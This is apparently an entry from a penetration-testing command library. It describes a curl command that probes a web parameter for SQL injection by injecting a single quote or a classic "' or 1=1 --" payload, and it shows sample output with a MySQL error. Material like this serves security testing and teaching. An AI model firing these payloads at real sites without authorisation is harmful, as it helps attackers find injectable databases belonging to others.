---
id: 6d115d1a-0c00-4519-9e42-765dc868286a
name: curl-sql-special-characters-test
type: command
executor: bash
data: 'curl -X GET "http://target.com/page?id=$_PAYLOAD" -v'
output: null
created_at: '2023-04-06T03:56:36.110238+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
tags:
  - web-testing
  - sqli
verified: true
validated: true
---

# curl-sql-special-characters-test

## Command

```bash
curl -X GET "http://target.com/page?id=$_PAYLOAD" -v
```

## Description

This command sends an HTTP GET request to a target web page with a parameterized payload in a query string, useful for testing SQL injection entry points by injecting special characters. Use it to observe server responses for signs of SQL errors or unexpected behavior.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PAYLOAD | The special character or encoded string to inject (e.g., ', %27) | Yes |
| target.com/page | The target URL endpoint with vulnerable parameter | Yes |
| -X GET | Specifies HTTP GET method | Built-in |
| -v | Verbose output to show headers and response details | Built-in |

## Examples

### Basic Usage

```bash
curl -X GET "http://example.com/search?q='" -v
```

### Advanced Usage

```bash
curl -X GET "http://example.com/page?id=%27 or 1=1 --" -v --proxy burp-proxy:8080
```

## Expected Output

A verbose HTTP response, potentially including SQL error messages like:

*   Trying 192.168.1.1:80...
* Connected to example.com (192.168.1.1) port 80
> GET /page?id=' HTTP/1.1
< HTTP/1.1 500 Internal Server Error
< Content-Type: text/html

<html><body>Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /var/www/script.php on line 10</body></html>

Success is indicated by database-specific errors revealing the backend SQL processing.

## Related

- [[procedures/SQL-Injection-Entry-Point-Detection]]
- [[tools/cURL]]
